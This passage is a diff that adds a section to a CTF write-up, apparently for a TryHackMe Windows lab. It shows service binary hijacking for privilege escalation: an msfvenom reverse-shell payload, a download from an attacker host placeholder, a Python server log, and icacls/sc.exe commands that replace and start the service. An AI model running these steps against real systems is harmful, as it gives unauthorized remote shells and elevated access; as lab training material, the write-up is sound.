@@ -156,3 +156,37 @@ wmic service get Name,DisplayName,StartName,PathName | findstr svcadmin
 
 > Looks like we actually have write permissions, leading to `service binary hijack`, where we can override the `srv.exe`, restart the service and execute it under the name of `svcadmin` user.
 
+
+> First, let's create our evil binary
+
+```zsh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.208 LPORT=4444 -f exe -o svc.exe
+```
+
+> Then configure the http.server using python to transfer the binary to target machine. To download it, we can use:
+
+```Powershell
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/svc.exe -OutFile .\svc.exe
+```
+
+
+```
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.128.175.147 - - [23/Sep/2026 08:34:11] "GET /svc.exe HTTP/1.1" 200 -
+```
+
+
+> Now setup a listener on kali, and start the service on target machine. Beware that you might run into permission error like I did, so grant the binary the permission to be run by everyone using icacls. Then you can replace the target binary with our evil binary, and run the service to get the reverse shell. And make sure to use `sc.exe` instead of an alias `sc` (Set-Content) which creates a new file.
+
+```Powershell
+icacls svc.exe /grant Everyone:F
+
+move .\svc.exe C:\Windows\THMSVC\svc.exe
+
+sc.exe start THMSvc
+```
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-38-30.png)
+
+![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Windows%20Jump/Images/Screenshot%20From%202026-09-23%2016-47-27.png)
